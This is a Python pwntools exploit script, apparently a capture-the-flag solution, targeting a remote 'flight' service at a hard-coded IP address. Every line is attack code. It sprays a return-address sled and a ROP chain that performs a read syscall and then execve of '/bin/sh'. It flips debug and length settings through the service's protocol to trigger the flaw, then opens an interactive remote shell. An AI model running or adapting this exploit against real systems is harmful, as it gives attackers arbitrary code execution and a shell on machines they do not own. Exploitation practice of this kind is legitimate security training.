from pwn import *


#p = process("./System")
p = remote("20.249.101.123",8888)

def make_cmd(cmd,data):
    payload = cmd
    payload += p8(1)
    payload += p32(len(data))
    payload += data
    return payload


prax = 0x0000000000403bad
prdi = 0x00000000004100dd # rax is valid
prdx = 0x000000000041e26e # rdx is valid
prsi = 0x0000000000417a2f # rax add
syscall = 0x466e12
#payload = p64(0x425698)*0x20000
payload = p64(0x466526)*(0x80000//8)
payload += p64(prax)
payload += p64(0x558570)
payload += p64(prdi)
payload += p64(0) 
payload += p64(prdx)
payload += p64(0xaa0)
payload += p64(prsi)
payload += p64(0x558330)
payload += p64(prax)
payload += p64(0)
payload += p64(syscall)
payload += p64(prax)
payload += p64(0x558570)
payload += p64(prdi)
payload += p64(0x558330) 
payload += p64(prdx)
payload += p64(0x0)
payload += p64(prsi)
payload += p64(0x0)
payload += p64(prax)
payload += p64(0x3b)
payload += p64(syscall)
payload += b"A"*(0x200000//8)
#0x100000
p.send(make_cmd(b"M",payload))
p.send(make_cmd(b"N",b"new_flight_name"))
payload = b"["
payload += p8(2)
payload += p32(9)
payload += b"DebugMode"
payload += p32(len("true"))
payload += b"true"
p.send(payload)
payload = b"["
payload += p8(2)
payload += p32(len("FlightNameLength"))
payload += b"FlightNameLength"
payload += p32(len("false"))
payload += b"false"
p.send(payload)

pause()
#p.send(make_cmd(b"d",b"StatusFlightNameLength"))
p.send(make_cmd(b"\\",b"StatusFlightNameLength"))
#p.send(make_cmd(b"\x01",b"StatusFlightNameLength"))
#p.send(make_cmd(b"d",b"StatusFlightNameLength"))
#p.send(make_cmd(b"M",b"A"*0x10))
#p.send(make_cmd(b"N",b"new_flight_name"))
p.send("/bin/sh\x00")
p.interactive()
